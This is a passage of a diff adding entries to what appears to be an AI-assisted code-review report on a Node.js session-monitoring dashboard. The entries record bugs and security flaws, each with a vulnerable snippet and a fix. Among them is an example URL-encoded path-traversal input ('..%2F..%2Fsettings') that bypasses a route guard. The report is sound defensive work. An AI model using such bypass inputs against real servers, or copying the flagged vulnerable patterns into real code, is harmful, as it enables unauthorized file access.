+        "description": "`parseSubAgent` 在解析 assistant 消息的 usage 时，只累加了 `_itok` (input_tokens) 和 `_otok` (output_tokens)，完全忽略了 `cache_read_input_tokens`。而 `pricing.calcCost` 使用 `_ctok` 来计算缓存读取费用。这导致所有子 Agent 的缓存读取成本被计为 0，成本估算偏保守（实际成本更高）。虽然影响较小，但数据不完整。",
+        "confidence": 0.9,
+        "category": "bug",
+        "rule_reference": "Data completeness: all token types must be tracked consistently across main sessions and sub-agents"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.9,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.9,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "bug"
+      ]
+    },
+    "code_snippet_bad": "if (obj.message && obj.message.usage) {\n  info._itok += (obj.message.usage.input_tokens || 0);\n  info._otok += (obj.message.usage.output_tokens || 0);\n}",
+    "code_snippet_good": "if (obj.message && obj.message.usage) {\n  info._itok += (obj.message.usage.input_tokens || 0);\n  info._otok += (obj.message.usage.output_tokens || 0);\n  info._ctok += (obj.message.usage.cache_read_input_tokens || 0);\n}",
+    "suggestion": "在 agents.js 的 parseSubAgent 中增加一行：`info._ctok += (obj.message.usage.cache_read_input_tokens || 0);`，与主会话解析（scanner.js 已正确追踪 _ctok）保持一致。"
+  },
+  {
+    "merged_id": "M-009",
+    "canonical_title": "parseSubAgent 与 buildRelationsResponse 存在显著的子 Agent 解析逻辑重复",
+    "canonical_severity": "P3 MEDIUM",
+    "canonical_description": "子 Agent 的 JSONL 解析逻辑在两处独立实现：`agents.js` 的 `parseSubAgent`（约 60 行）和 `routes/session.js` 的 `buildRelationsResponse`（约 40 行）。两者都在遍历 lines、提取标题、累加 token、检测 stop_reason、统计 toolCallCount。`parseSubAgent` 还做了 meta.json 标题覆盖和 keyDecisions 收集，`buildRelationsResponse` 则额外计算 cost 和 status。如果解析逻辑需要调整（如支持新的消息格式），两处都必须同步修改。",
+    "category": "maintainability",
+    "file": "agents.js",
+    "line_range": [
+      50,
+      110
+    ],
+    "sources": [
+      {
+        "agent": "A",
+        "finding_id": "A-010",
+        "severity": "suggestion",
+        "unified_severity": "P3 MEDIUM",
+        "title": "parseSubAgent 与 buildRelationsResponse 存在显著的子 Agent 解析逻辑重复",
+        "description": "子 Agent 的 JSONL 解析逻辑在两处独立实现：`agents.js` 的 `parseSubAgent`（约 60 行）和 `routes/session.js` 的 `buildRelationsResponse`（约 40 行）。两者都在遍历 lines、提取标题、累加 token、检测 stop_reason、统计 toolCallCount。`parseSubAgent` 还做了 meta.json 标题覆盖和 keyDecisions 收集，`buildRelationsResponse` 则额外计算 cost 和 status。如果解析逻辑需要调整（如支持新的消息格式），两处都必须同步修改。",
+        "confidence": 0.9,
+        "category": "maintainability",
+        "rule_reference": "DRY: identical parsing logic duplicated across modules"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.9,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.9,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "maintainability"
+      ]
+    },
+    "suggestion": "让 `buildRelationsResponse` 直接调用 `agents.parseSubAgent(filePath, agentId, parentSessionId)` 获取已解析的 agent 信息，再补充 relations 特有的边匹配逻辑。这样可以删除约 40 行重复代码，并确保解析逻辑只有一处权威来源。"
+  },
+  {
+    "merged_id": "M-017",
+    "canonical_title": "swapSettingsJson writes attacker-controlled file content to settings.json without validation",
+    "canonical_severity": "P1 CRITICAL",
+    "canonical_description": "The swapSettingsJson function reads a config file (whose path is partially attacker-controlled via B-003) and writes its contents directly to ~/.claude/settings.json. There is no validation that the content is valid JSON, no schema check, and no backup. If an attacker can point configFile to a large binary file, this could corrupt settings.json and potentially break the Claude Code CLI. The function also provides no mechanism to revert to the original settings after a failed or malicious swap (the ORIGINAL_SETTINGS snapshot exists in launchSessionDirect but not in swapSettingsJson itself).",
+    "category": "security",
+    "file": "routes/open.js",
+    "line_range": [
+      178,
+      195
+    ],
+    "sources": [
+      {
+        "agent": "B",
+        "finding_id": "B-006",
+        "severity": "important",
+        "unified_severity": "P1 CRITICAL",
+        "title": "swapSettingsJson writes attacker-controlled file content to settings.json without validation",
+        "description": "The swapSettingsJson function reads a config file (whose path is partially attacker-controlled via B-003) and writes its contents directly to ~/.claude/settings.json. There is no validation that the content is valid JSON, no schema check, and no backup. If an attacker can point configFile to a large binary file, this could corrupt settings.json and potentially break the Claude Code CLI. The function also provides no mechanism to revert to the original settings after a failed or malicious swap (the ORIGINAL_SETTINGS snapshot exists in launchSessionDirect but not in swapSettingsJson itself).",
+        "confidence": 0.9,
+        "category": "security",
+        "rule_reference": "CWE-20: Improper Input Validation"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.9,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.9,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "security"
+      ]
+    },
+    "code_snippet_bad": "var targetSettings = fs.readFileSync(targetConfigPath, \"utf-8\");\nif (currentSettings !== targetSettings) {\n  fs.writeFileSync(defaultSettingsPath, targetSettings, \"utf-8\");\n  shared.currentSettingsConfig = configFile;\n}",
+    "code_snippet_good": "var targetSettings = fs.readFileSync(targetConfigPath, \"utf-8\");\ntry { JSON.parse(targetSettings); } catch(e) { return; }\nif (currentSettings !== targetSettings) {\n  fs.writeFileSync(defaultSettingsPath + \".bak\", currentSettings, \"utf-8\");\n  fs.writeFileSync(defaultSettingsPath, targetSettings, \"utf-8\");\n  shared.currentSettingsConfig = configFile;\n}",
+    "suggestion": "Validate that the target config content is valid JSON and conforms to the expected settings schema before writing. Create a backup of settings.json before overwriting (e.g., settings.json.bak). Consider using atomic writes (write to temp file, then rename) to prevent corruption on partial writes."
+  },
+  {
+    "merged_id": "M-006",
+    "canonical_title": "全局可变状态缺乏并发控制，多请求场景下存在数据竞争风险",
+    "canonical_severity": "P1 CRITICAL",
+    "canonical_description": "`sessionCache`、`subAgentCache`、`fileOffsets`、`sseClients`、`snapshotList` 等全部作为 shared 模块的全局可变状态暴露。多个并发请求同时调用 `scanSessions` 会读写同一个 `sessionCache` Map，`processChanges`（由文件监控/定时器触发）也会并发修改。虽然 Node.js 单线程避免了真正的并行竞态，但异步交错执行仍可导致：缓存被部分更新时另一个请求读到不一致的中间状态、`fileOffsets` 和 `sessionCache` 不同步、`scanSubAgents` 的 `clear()` + 重建期间其他代码读到空缓存。",
+    "category": "maintainability",
+    "file": "shared.js",
+    "line_range": [
+      44,
+      65
+    ],
+    "sources": [
+      {
+        "agent": "A",
+        "finding_id": "A-006",
+        "severity": "important",
+        "unified_severity": "P1 CRITICAL",
+        "title": "全局可变状态缺乏并发控制，多请求场景下存在数据竞争风险",
+        "description": "`sessionCache`、`subAgentCache`、`fileOffsets`、`sseClients`、`snapshotList` 等全部作为 shared 模块的全局可变状态暴露。多个并发请求同时调用 `scanSessions` 会读写同一个 `sessionCache` Map，`processChanges`（由文件监控/定时器触发）也会并发修改。虽然 Node.js 单线程避免了真正的并行竞态，但异步交错执行仍可导致：缓存被部分更新时另一个请求读到不一致的中间状态、`fileOffsets` 和 `sessionCache` 不同步、`scanSubAgents` 的 `clear()` + 重建期间其他代码读到空缓存。",
+        "confidence": 0.88,
+        "category": "maintainability",
+        "rule_reference": "Shared mutable state is the root of many concurrency bugs"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.88,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.88,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "maintainability"
+      ]
+    },
+    "suggestion": "引入简单的读写锁或使用不可变更新模式（缓存更新时创建新 Map 再原子替换引用）。至少对 `scanSubAgents` 的 `clear()` → 重建过程加一个完成标志位，让消费者在重建期间等待或使用旧数据。考虑将缓存封装到独立的 CacheManager 类中，提供线程安全（async-safe）的 get/set/invalidate 接口。"
+  },
+  {
+    "merged_id": "M-018",
+    "canonical_title": "Math.random() used for session IDs and UUIDs — predictable and forgeable",
+    "canonical_severity": "P1 CRITICAL",
+    "canonical_description": "Session IDs and UUIDs are generated using Math.random(), which is not cryptographically secure. In V8 (Node.js), Math.random() uses xorshift128+ which is predictable given a few observed outputs. An attacker who can observe generated session IDs could predict future session IDs and potentially hijack or interfere with new sessions. The PID used for session metadata is also generated with Math.random (line 172). This is used in three locations: line 109 (sessionId), line 128 (genUuid), and line 172 (fakePid).",
+    "category": "security",
+    "file": "index.js",
+    "line_range": [
+      107,
+      133
+    ],
+    "sources": [
+      {
+        "agent": "B",
+        "finding_id": "B-007",
+        "severity": "important",
+        "unified_severity": "P1 CRITICAL",
+        "title": "Math.random() used for session IDs and UUIDs — predictable and forgeable",
+        "description": "Session IDs and UUIDs are generated using Math.random(), which is not cryptographically secure. In V8 (Node.js), Math.random() uses xorshift128+ which is predictable given a few observed outputs. An attacker who can observe generated session IDs could predict future session IDs and potentially hijack or interfere with new sessions. The PID used for session metadata is also generated with Math.random (line 172). This is used in three locations: line 109 (sessionId), line 128 (genUuid), and line 172 (fakePid).",
+        "confidence": 0.88,
+        "category": "security",
+        "rule_reference": "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.88,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.88,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "security"
+      ]
+    },
+    "code_snippet_bad": "var sessionId = \"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx\".replace(/[xy]/g, function(c) {\n  var r = Math.random() * 16 | 0, v = c === \"x\" ? r : (r & 0x3 | 0x8);\n  return v.toString(16);\n});",
+    "code_snippet_good": "var crypto = require(\"crypto\");\nvar sessionId = crypto.randomUUID();",
+    "suggestion": "Use crypto.randomUUID() (available in Node.js 19+) or crypto.randomBytes(16).toString('hex') for UUID generation. For the fake PID, use the actual process PID or a cryptographically random number. Example: const crypto = require('crypto'); const sessionId = crypto.randomUUID();"
+  },
+  {
+    "merged_id": "M-022",
+    "canonical_title": "URL-encoding bypass: guard checks operate on raw req.url, not decoded path",
+    "canonical_severity": "P1 CRITICAL",
+    "canonical_description": "The snapshot detail guard at line 20 checks req.url.indexOf('/api/snapshot/delete') on the raw, un-decoded URL. However, the actual path parameter is decoded at line 21 using decodeURI(). An attacker can craft a URL like /api/snapshot/..%2F..%2Fsettings where the literal substring '/api/snapshot/delete' never appears, but after decodeURI the snapId becomes ../../settings. This bypasses the guard meant to exclude delete/create/rollback paths from the detail view handler. While this specific bypass leads to the detail (read) handler rather than delete, it demonstrates inconsistent URL handling that could be exploited if new guarded routes are added.",
+    "category": "security",
+    "file": "routes/snapshots.js",
+    "line_range": [
+      20,
+      21
+    ],
+    "sources": [
+      {
+        "agent": "B",
+        "finding_id": "B-011",
+        "severity": "important",
+        "unified_severity": "P1 CRITICAL",
+        "title": "URL-encoding bypass: guard checks operate on raw req.url, not decoded path",
+        "description": "The snapshot detail guard at line 20 checks req.url.indexOf('/api/snapshot/delete') on the raw, un-decoded URL. However, the actual path parameter is decoded at line 21 using decodeURI(). An attacker can craft a URL like /api/snapshot/..%2F..%2Fsettings where the literal substring '/api/snapshot/delete' never appears, but after decodeURI the snapId becomes ../../settings. This bypasses the guard meant to exclude delete/create/rollback paths from the detail view handler. While this specific bypass leads to the detail (read) handler rather than delete, it demonstrates inconsistent URL handling that could be exploited if new guarded routes are added.",
+        "confidence": 0.87,
+        "category": "security",
+        "rule_reference": "CWE-177: Improper Handling of URL Encoding (Double Encoding)"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.87,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.87,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "security"
+      ]
+    },
+    "code_snippet_bad": "if (req.url.startsWith(\"/api/snapshot/\") && req.url.indexOf(\"/api/snapshot/create\") === -1 && req.url.indexOf(\"/api/snapshot/delete\") === -1 && req.url.indexOf(\"/api/snapshot/rollback\") === -1) {\n  var snapId = decodeURI(req.url.split(\"/api/snapshot/\")[1]);",
+    "code_snippet_good": "var parsed = new URL(req.url, \"http://localhost\");\nvar pathname = parsed.pathname;\nif (pathname.startsWith(\"/api/snapshot/\") && !pathname.startsWith(\"/api/snapshot/create\") && !pathname.startsWith(\"/api/snapshot/delete\") && !pathname.startsWith(\"/api/snapshot/rollback\")) {\n  var snapId = pathname.split(\"/api/snapshot/\")[1];",
+    "suggestion": "Parse req.url with the URL constructor (new URL(req.url, 'http://localhost')) to get the normalized pathname before doing route matching. This prevents encoding-based bypasses. Apply this consistently across all route handlers."
+  },
+  {
+    "merged_id": "M-003",
+    "canonical_title": "UUID 级联替换可能导致内容损坏",
+    "canonical_severity": "P1 CRITICAL",
+    "canonical_description": "UUID 映射替换逻辑对每个旧 UUID 依次执行 `newContent.split(oldUuid).join(newUuid)`，但未处理 UUID 间的子串关系。虽然 UUID 发生子串碰撞概率极低，但 JSONL 文件中 UUID 会出现在 JSON 字符串值（如 tool_use 的 input 字段）中。更致命的是：文本内容（如 AI 回复中包含调试输出的 UUID）中的 UUID 也会被替换，导致会话记录被静默损坏。此外，同一个旧 UUID 的不同大小写出现被分别替换为相同的 newUuid，这本身逻辑正确，但 `Object.keys(uuidMap)` 的顺序是不确定的（V8 中通常按插入顺序但 ES 规范不保证），可能导致跨运行的替换结果不一致。",
+    "category": "bug",
+    "file": "index.js",
+    "line_range": [
+      95,
+      115
+    ],
+    "sources": [
+      {
+        "agent": "A",
+        "finding_id": "A-003",
+        "severity": "important",
+        "unified_severity": "P1 CRITICAL",
+        "title": "UUID 级联替换可能导致内容损坏",
+        "description": "UUID 映射替换逻辑对每个旧 UUID 依次执行 `newContent.split(oldUuid).join(newUuid)`，但未处理 UUID 间的子串关系。虽然 UUID 发生子串碰撞概率极低，但 JSONL 文件中 UUID 会出现在 JSON 字符串值（如 tool_use 的 input 字段）中。更致命的是：文本内容（如 AI 回复中包含调试输出的 UUID）中的 UUID 也会被替换，导致会话记录被静默损坏。此外，同一个旧 UUID 的不同大小写出现被分别替换为相同的 newUuid，这本身逻辑正确，但 `Object.keys(uuidMap)` 的顺序是不确定的（V8 中通常按插入顺序但 ES 规范不保证），可能导致跨运行的替换结果不一致。",
+        "confidence": 0.85,
+        "category": "bug",
+        "rule_reference": "Correctness of string replacement in structured data"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.85,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.85,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "bug"
+      ]
+    },
+    "code_snippet_bad": "for (var oi = 0; oi < oldUuids.length; oi++) {\n  newContent = newContent.split(oldUuids[oi]).join(uuidMap[oldUuids[oi]]);\n  newContent = newContent.split(oldUuids[oi].toUpperCase()).join(uuidMap[oldUuids[oi]]);\n}",
+    "code_snippet_good": "var sortedUuids = oldUuids.sort(function(a, b) { return b.length - a.length; });\nfor (var oi = 0; oi < sortedUuids.length; oi++) {\n  var escaped = sortedUuids[oi].replace(/[-\\\\^$*+?.()|[\\]{}]/g, '\\\\$&');\n  var regex = new RegExp(escaped, 'gi');\n  newContent = newContent.replace(regex, uuidMap[sortedUuids[oi].toLowerCase()]);\n}",
+    "suggestion": "仅在 JSON 结构字段中替换 UUID（如 sessionId, parentSessionId 等已知字段），而非全文盲替。或者在替换前对 UUID 按长度降序排序，先替换长的 UUID 避免子串问题。对 JSON 值中出现的不在映射表中的 UUID，不应替换而是生成新的映射。"
+  },
+  {
+    "merged_id": "M-019",
+    "canonical_title": "Race condition: settings.json restore timer fires after 5s regardless of concurrent swaps",
+    "canonical_severity": "P1 CRITICAL",
+    "canonical_description": "launchSessionDirect swaps settings.json to the target config, then sets a 5-second timeout to restore the original settings. If a second launchSessionDirect or launchTerminalBat is called within that 5-second window, the restore from the first call will overwrite the settings that the second call just set. Additionally, if the VSCode extension reads settings.json after the 5-second restore, it will see the wrong configuration. There is no coordination between concurrent calls — no queue, no reference counting, and no cancellation of pending timers.",
+    "category": "bug",
+    "file": "routes/open.js",
+    "line_range": [
+      216,
+      234
+    ],
+    "sources": [
+      {
+        "agent": "B",
+        "finding_id": "B-008",
+        "severity": "important",
+        "unified_severity": "P1 CRITICAL",
+        "title": "Race condition: settings.json restore timer fires after 5s regardless of concurrent swaps",
+        "description": "launchSessionDirect swaps settings.json to the target config, then sets a 5-second timeout to restore the original settings. If a second launchSessionDirect or launchTerminalBat is called within that 5-second window, the restore from the first call will overwrite the settings that the second call just set. Additionally, if the VSCode extension reads settings.json after the 5-second restore, it will see the wrong configuration. There is no coordination between concurrent calls — no queue, no reference counting, and no cancellation of pending timers.",
+        "confidence": 0.85,
+        "category": "bug",
+        "rule_reference": "CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.85,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.85,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "bug"
+      ]
+    },
+    "code_snippet_bad": "setTimeout(function() {\n  try {\n    var currentSettings = fsModule.readFileSync(defaultSettingsPath, \"utf-8\");\n    if (ORIGINAL_SETTINGS && currentSettings !== ORIGINAL_SETTINGS) {\n      fsModule.writeFileSync(defaultSettingsPath, ORIGINAL_SETTINGS, \"utf-8\");\n    }\n  } catch(e) {}\n}, 5000);",
+    "code_snippet_good": "// At module level:\nvar _restoreTimer = null;\nfunction scheduleRestore() {\n  if (_restoreTimer) clearTimeout(_restoreTimer);\n  _restoreTimer = setTimeout(function() {\n    try {\n      var current = fsModule.readFileSync(defaultSettingsPath, \"utf-8\");\n      if (ORIGINAL_SETTINGS && current !== ORIGINAL_SETTINGS) {\n        fsModule.writeFileSync(defaultSettingsPath, ORIGINAL_SETTINGS, \"utf-8\");\n      }\n    } catch(e) {}\n    _restoreTimer = null;\n  }, 5000);\n}",
+    "suggestion": "Implement a proper settings swap manager: use a single shared variable to track the pending restore timeout (cancel and restart on each new swap), or use a reference-counting approach where settings.json is only restored when all active sessions using the swapped config have completed. At minimum, clear the previous timeout before setting a new one, extending the window rather than creating conflicting restores."
+  },
+  {
+    "merged_id": "M-010",
+    "canonical_title": "parseSessionChunk 对大文件分配完整 Buffer，且未限制内存上限",
+    "canonical_severity": "P3 MEDIUM",
+    "canonical_description": "`Buffer.alloc(Math.max(1, stat.size - startOffset))` 在首次扫描大文件（startOffset=0）时分配与文件大小相等的 Buffer。对于 200MB 的会话文件，这会直接分配 200MB 堆内存，可能导致内存压力甚至 OOM。虽然 V8 的 Buffer.alloc 会清零内存（比 allocUnsafe 慢），但对于增量场景（startOffset > 0）分配较小 Buffer 是合理的。问题主要在首次全量解析。",
+    "category": "performance",
+    "file": "scanner.js",
+    "line_range": [
+      95,
+      110
+    ],
+    "sources": [
+      {
+        "agent": "A",
+        "finding_id": "A-011",
+        "severity": "suggestion",
+        "unified_severity": "P3 MEDIUM",
+        "title": "parseSessionChunk 对大文件分配完整 Buffer，且未限制内存上限",
+        "description": "`Buffer.alloc(Math.max(1, stat.size - startOffset))` 在首次扫描大文件（startOffset=0）时分配与文件大小相等的 Buffer。对于 200MB 的会话文件，这会直接分配 200MB 堆内存，可能导致内存压力甚至 OOM。虽然 V8 的 Buffer.alloc 会清零内存（比 allocUnsafe 慢），但对于增量场景（startOffset > 0）分配较小 Buffer 是合理的。问题主要在首次全量解析。",
+        "confidence": 0.82,
+        "category": "performance",
+        "rule_reference": "Defensive memory management: limit buffer allocations in I/O paths"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.82,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.82,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "performance"
+      ]
+    },
+    "code_snippet_bad": "var buf = Buffer.alloc(Math.max(1, stat.size - startOffset));",
+    "code_snippet_good": "var readSize = Math.max(1, stat.size - startOffset);\nvar maxRead = 10 * 1024 * 1024;\nif (startOffset === 0 && readSize > maxRead) readSize = maxRead;\nvar buf = Buffer.allocUnsafe(readSize);",
+    "suggestion": "对首次解析设置合理的读取上限（如 10MB），超过时使用流式逐行读取而非一次性读入内存。或者至少使用 `Buffer.allocUnsafe` 替代 `Buffer.alloc`（因为紧接着就被 `readSync` 覆盖填充），省去清零开销。对于增量场景（startOffset > 0），当前分配策略是合理的。"
+  },
+  {
+    "merged_id": "M-023",
+    "canonical_title": "parseSessionChunk tail-offset may produce corrupted first line when reading partial content",
+    "canonical_severity": "P1 CRITICAL",
+    "canonical_description": "When reading a chunk starting from an offset (incremental scan), the function seeks to startOffset bytes into the file. However, the offset points to the byte after the last complete line. If the file is modified in a way that the byte at startOffset is mid-line (e.g., the file was truncated and then appended, or the offset tracking was wrong), the first line read will be a partial/corrupted JSON line. The code at lines 109-114 attempt to skip the first line if 'tailBytes < fsize' (which is always true when startOffset > 0 unless the file is empty), but this check is from a different code path (session detail handler, line 52-60 of session.js) — it's not present in parseSessionChunk itself. parseSessionChunk just splits lines starting from startOffset and tries to parse each one, potentially producing garbage data or missing the first partial line.",
+    "category": "bug",
+    "file": "scanner.js",
+    "line_range": [
+      87,
+      145
+    ],
+    "sources": [
+      {
+        "agent": "B",
+        "finding_id": "B-012",
+        "severity": "important",
+        "unified_severity": "P1 CRITICAL",
+        "title": "parseSessionChunk tail-offset may produce corrupted first line when reading partial content",
+        "description": "When reading a chunk starting from an offset (incremental scan), the function seeks to startOffset bytes into the file. However, the offset points to the byte after the last complete line. If the file is modified in a way that the byte at startOffset is mid-line (e.g., the file was truncated and then appended, or the offset tracking was wrong), the first line read will be a partial/corrupted JSON line. The code at lines 109-114 attempt to skip the first line if 'tailBytes < fsize' (which is always true when startOffset > 0 unless the file is empty), but this check is from a different code path (session detail handler, line 52-60 of session.js) — it's not present in parseSessionChunk itself. parseSessionChunk just splits lines starting from startOffset and tries to parse each one, potentially producing garbage data or missing the first partial line.",
+        "confidence": 0.82,
+        "category": "bug",
+        "rule_reference": "N/A — correctness bug in incremental file parsing"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.82,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.82,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "bug"
+      ]
+    },
+    "code_snippet_bad": "var buf = Buffer.alloc(Math.max(1, stat.size - startOffset));\nvar bytesRead = fs.readSync(fd, buf, 0, buf.length, startOffset);\ncontent = buf.toString(\"utf-8\", 0, bytesRead);\n// ...\nvar lines = content.split(\"\\n\");\nfor (var i = 0; i < lines.length; i++) {\n  var obj = parseLine(lines[i]);",
+    "code_snippet_good": "var buf = Buffer.alloc(Math.max(1, stat.size - startOffset));\nvar bytesRead = fs.readSync(fd, buf, 0, buf.length, startOffset);\ncontent = buf.toString(\"utf-8\", 0, bytesRead);\nif (startOffset > 0) {\n  var firstNl = content.indexOf(\"\\n\");\n  if (firstNl >= 0) content = content.slice(firstNl + 1);\n}\nvar lines = content.split(\"\\n\");\nfor (var i = 0; i < lines.length; i++) {\n  var obj = parseLine(lines[i]);",
+    "suggestion": "After reading from startOffset, scan forward to the next newline character before beginning line-by-line parsing. This ensures the parser always starts at a line boundary. Also consider using a persistent fd or checking the mtime to detect truncation."
+  },
+  {
+    "merged_id": "M-021",
+    "canonical_title": "No rate limiting on any endpoint — trivial DoS via repeated heavy requests",
+    "canonical_severity": "P1 CRITICAL",
+    "canonical_description": "The server has no rate limiting, request throttling, or timeout enforcement on any endpoint. An attacker (or a malfunctioning client) can: (1) repeatedly call /api/create-and-open to exhaust disk space by creating session files, (2) call /api/session/*?full=1 to force the server to read and parse entire large JSONL files into memory repeatedly, (3) open unlimited SSE connections (capped at 50, but 50 concurrent long-lived connections still consume resources). The snapshot auto-cleanup caps at 30 auto-snapshots, but manual snapshots have no limit.",
+    "category": "security",
+    "file": "index.js",
+    "line_range": [
+      22,
+      220
+    ],
+    "sources": [
+      {
+        "agent": "B",
+        "finding_id": "B-010",
+        "severity": "important",
+        "unified_severity": "P1 CRITICAL",
+        "title": "No rate limiting on any endpoint — trivial DoS via repeated heavy requests",
+        "description": "The server has no rate limiting, request throttling, or timeout enforcement on any endpoint. An attacker (or a malfunctioning client) can: (1) repeatedly call /api/create-and-open to exhaust disk space by creating session files, (2) call /api/session/*?full=1 to force the server to read and parse entire large JSONL files into memory repeatedly, (3) open unlimited SSE connections (capped at 50, but 50 concurrent long-lived connections still consume resources). The snapshot auto-cleanup caps at 30 auto-snapshots, but manual snapshots have no limit.",
+        "confidence": 0.8,
+        "category": "security",
+        "rule_reference": "CWE-770: Allocation of Resources Without Limits or Throttling"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.8,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.8,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "security"
+      ]
+    },
+    "suggestion": "Implement per-endpoint rate limiting (e.g., 10 req/s for read endpoints, 1 req/s for write endpoints). Add a maximum request body size. Add a timeout for session detail parsing (limit the number of lines parsed). Cap the total number of manual snapshots."
+  },
+  {
+    "merged_id": "M-011",
+    "canonical_title": "getStatus 的 '异常' 状态对于 fileAge < 10分钟的 tool_use 存在误判窗口",
+    "canonical_severity": "P2 HIGH",
+    "canonical_description": "`getStatus` 在 `lastMeaningfulStopReason === 'tool_use'` 时，若 `fileAge >= 10分钟` 则返回 `'异常'`。但在以下场景会误判：(1) Agent 正在执行一个耗时超过 10 分钟的长时间工具调用（如大型文件写入），期间文件确实不会被修改 — 此时 Agent 并未崩溃，但面板显示异常；(2) 会话文件位于网络驱动器或 WSL 文件系统上，mtime 更新可能延迟。10 分钟的硬编码阈值缺乏灵活性。",
+    "category": "correctness",
+    "file": "scanner.js",
+    "line_range": [
+      15,
+      50
+    ],
+    "sources": [
+      {
+        "agent": "A",
+        "finding_id": "A-012",
+        "severity": "nit",
+        "unified_severity": "P2 HIGH",
+        "title": "getStatus 的 '异常' 状态对于 fileAge < 10分钟的 tool_use 存在误判窗口",
+        "description": "`getStatus` 在 `lastMeaningfulStopReason === 'tool_use'` 时，若 `fileAge >= 10分钟` 则返回 `'异常'`。但在以下场景会误判：(1) Agent 正在执行一个耗时超过 10 分钟的长时间工具调用（如大型文件写入），期间文件确实不会被修改 — 此时 Agent 并未崩溃，但面板显示异常；(2) 会话文件位于网络驱动器或 WSL 文件系统上，mtime 更新可能延迟。10 分钟的硬编码阈值缺乏灵活性。",
+        "confidence": 0.78,
+        "category": "correctness",
+        "rule_reference": "Status detection heuristic: avoid false positives for long-running tool calls"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.78,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.78,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "correctness"
+      ]
+    },
+    "suggestion": "考虑引入多信号判断：除了 fileAge，还检查是否有活跃的进程 PID（从 session metadata 文件中读取），或使用心跳机制。将硬编码的 10 分钟阈值提取为可配置常量 `shared.TOOL_USE_TIMEOUT_MS`。至少将阈值放宽到 30 分钟以覆盖大文件操作场景。"
+  },
+  {
+    "merged_id": "M-024",
+    "canonical_title": "Single session API uses keyDecisions from cache without per-request deduplication",
+    "canonical_severity": "P1 CRITICAL",
+    "canonical_description": "The session detail response at line 87 returns cached.keyDecisions directly. Since keyDecisions are append-only in mergeSessionData (scanner.js line 227-231), repeated API calls for the same session will show growing duplicate decision lists as the cache accumulates data across incremental scans. The decisions array could contain the same tool calls multiple times if mergeSessionData is called with overlapping delta ranges. In the waterfall/relations view for the same session, no deduplication is performed at all.",
+    "category": "bug",
+    "file": "routes/session.js",
+    "line_range": [
+      28,
+      43
+    ],
+    "sources": [
+      {
+        "agent": "B",
+        "finding_id": "B-013",
+        "severity": "important",
+        "unified_severity": "P1 CRITICAL",
+        "title": "Single session API uses keyDecisions from cache without per-request deduplication",
+        "description": "The session detail response at line 87 returns cached.keyDecisions directly. Since keyDecisions are append-only in mergeSessionData (scanner.js line 227-231), repeated API calls for the same session will show growing duplicate decision lists as the cache accumulates data across incremental scans. The decisions array could contain the same tool calls multiple times if mergeSessionData is called with overlapping delta ranges. In the waterfall/relations view for the same session, no deduplication is performed at all.",
+        "confidence": 0.78,
+        "category": "bug",
+        "rule_reference": "N/A — data correctness bug"
+      }
+    ],
+    "consensus": {
+      "base_confidence": 0.78,
+      "consensus_boost": 0.0,
+      "final_confidence": 0.78,
+      "agent_count": 1
+    },
+    "status": "single_source",
+    "conflicts": {
+      "severity_conflict": false,
+      "severity_gap": 0,
+      "category_conflict": false,
+      "categories": [
+        "bug"
+      ]
+    },
